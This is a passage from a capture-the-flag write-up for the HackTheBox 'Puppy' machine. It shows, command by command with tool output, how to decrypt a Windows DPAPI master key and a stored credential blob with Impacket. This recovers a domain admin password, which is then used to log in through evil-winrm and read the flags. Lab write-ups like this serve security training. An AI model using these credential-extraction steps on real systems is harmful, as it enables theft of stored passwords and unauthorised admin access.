echo "AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=" | base64 -d > master_key
```

Now, we can use `dpapi.py`, first of all, we need to decrypt the `masterkey`:

```python
python3 dpapi.py masterkey -file master_key -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password ChefSteph2025!
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

We got the decrypted key, let's decrypt the credential blob:

```python
python3 dpapi.py credential -f steph_cred -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

There we go, we got credentials for `steph.cooper_adm`, this is an admin user we know this due to bloodhound:

![](images/Pasted%20image%2020250610181952.png)

We can now access `winrm` as the admin user:

```
evil-winrm -i 10.10.11.70 -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
```

![](images/Pasted%20image%2020250610182214.png)

Let's read both flags and end the CTF:

```
*Evil-WinRM* PS C:\Users> type C:\Users\adam.silver\Desktop\user.txt
8ba979b5feb8e66114bee3a867bf69ab

*Evil-WinRM* PS C:\Users> type C:\Users\Administrator\Desktop\root.txt
994702fce26ced9214c2669e92f0c333
```

![](images/Pasted%20image%2020250610182434.png)

https://www.hackthebox.com/achievement/machine/1872557/661


